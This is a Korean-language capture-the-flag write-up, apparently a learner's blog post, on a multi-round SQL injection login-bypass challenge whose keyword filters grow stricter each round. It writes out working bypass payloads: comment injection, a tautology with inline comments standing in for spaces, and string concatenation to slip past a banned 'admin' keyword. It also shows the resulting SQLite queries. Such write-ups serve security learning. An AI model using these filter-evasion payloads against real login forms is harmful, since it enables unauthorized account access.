라운드마다 금지된 문자들이 있어 그걸 제외하고 뚫는 문제였다.

1단계 : 금지어 = or
admin' -- 비번: 아무거나  SELECT * FROM users WHERE username='admin' --' AND password='1234

2단계 : 금지어 = or, and, =, like, --
admin' /* 비번 : 스페이스 두번으로 공백을 만들어 비워두었다. SELECT * FROM users WHERE username='admin'/*' AND password=' '
/*를 통해 나머지 뒤에 비번 쪽이 주석 처리가 되어 로그인이 가능해짐

3단계 : 금지어 = or, and, =, like, >, <, --
금지어에 */ 가 없어 2단계와 같이 주석처리하고 실행할라했는데 아예 Invalid username/password 이런 문장도 안뜨고 바뀐게 없어서 앞에 했던거에서 주석의
끝을 찾지 못해 문장이 끝나지 않았다고(?) 여겨 이렇게 뜬다고 판단함.
발전시켜야 할점 - 근데 그렇게 따지면 왜 2단계에서는 주석 끝나는게 없었는데 통과가 됐는가에 대해 조사해보니 3단계보다 내 부 쿼리가 간단해 문법적으로는 틀렸지만 작동은 되는
상태일 수도 있음을 알고 다른 >< 와 같은 다른 문자로 다시 시도해 보았으나 성공하진 못함.

아무튼 그래서 주석을 끝내는 말을 비번에 쳐서 변화를 주고자 했지만 아래와 같은 경고 문구가 뜨면서 문제 해결 불가.
SELECT * FROM users WHERE username='admin'/*' AND password='*/'
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'" in /var/www/html/index.php on line 26

이렇게 뜨면서 따옴포(') 문제로 인해 해결이 안됨

아디 : admin 비번 : ' IS NOT '1 이렇게 했는데 이번엔 아예 아무것도 안뜸
그래서 아디 : admin 비번 : 'IS/**/NOT/**/'1 이렇게 했는데 해결됨
따라서 공백을 감지하면 코드를 중단시키는? 그러한 규제가 있었음을 파악함

4단계 : 금지어 = or and = like > < -- admin
admin을 아예 사용할 수 없게 만들어서 adm'||'in 이런식으로 ||를 이용해 필터를 속이고 실제로는 admin을 입력하는 것처럼 했 고
비번은 아까와 같이 비밀번호가 1이 아니면 참이 되는 문구를 작성시켜 통과함
SELECT * FROM users WHERE username='adm'||'in' AND password=''IS/**/NOT/**/'1'

5단계 : 금지어 = or and = like > < -- union admin

## 배운 점

단순히 정해진 값을 넣는게 아니라 사이트의 반응을 살피며, 하나하나 경우의 수를 따져가며 금지된 것들의 대체수단을 찾아가며 풀어가는 과정에서 이게 진짜 해킹이구나 하는 뿌듯함을 느꼈다.
특히 이전과 다르게 빨간 글씨도 뜨지 않고 단순히 하얀 화면만 떴을 때는 정말 막막했는데, 그러한 것들조차 다 이유가 있었고 또 그러한 점들을
분석해 해결하고 나니 정말 짜릿했다. 이를 통해 문제에 당면했을 때 그저 손놓고 있는 것이 아닌 작은것 부터 따져가며 어디가 취약할지 고민하는
단계까지 성장할 수 있었다.
